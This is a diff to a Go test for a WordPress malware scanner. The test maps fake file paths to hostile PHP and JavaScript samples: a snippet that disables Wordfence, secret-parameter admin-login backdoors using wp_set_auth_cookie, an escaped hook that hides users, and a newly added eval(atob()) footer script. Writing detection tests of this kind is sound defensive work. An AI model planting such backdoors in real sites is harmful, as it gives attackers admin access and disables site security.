@@ -546,6 +546,7 @@ func TestShippedRulesCatchCorpusFamilies(t *testing.T) {
 		"plugins/x/kill-wf.php":          {"<?php if (is_dir(WP_PLUGIN_DIR . '/wordfence')) { deactivate_plugins('wordfence/wordfence.php'); rename(WP_PLUGIN_DIR . '/wordfence', WP_PLUGIN_DIR . '/wordfence_'); }", "wordfence-disabling"},
 		"uploads/2024/login.php":         {"<?php if ($_GET['k'] === 'x') { wp_set_auth_cookie(1, true); }", "unauth-admin-login"},
 		"themes/t/inc/helpers.php":       {"<?php add_action('init', function () { if (isset($_GET['tk']) && $_GET['tk'] === 'z') { $u = get_users(['role' => 'administrator', 'number' => 1]); wp_set_auth_cookie($u[0]->ID, true); } });", "theme-auth-cookie-backdoor"},
+		"themes/t/footer.php":            {"<?php wp_footer(); ?><script>eval(atob('ZG9jdW1lbnQud3JpdGUoMSk='))</script>", "js-eval-decoded"},
 		"uploads/wp-security-helper.php": {"<?php add_action(\"\\160\\162\\x65\\137\\147\\145\\x74\\137\\x75\\163\\145\\162\\163\", 'hide');", "hidden-user-query-hook-escaped"},
 	}
 	for rel, c := range cases {
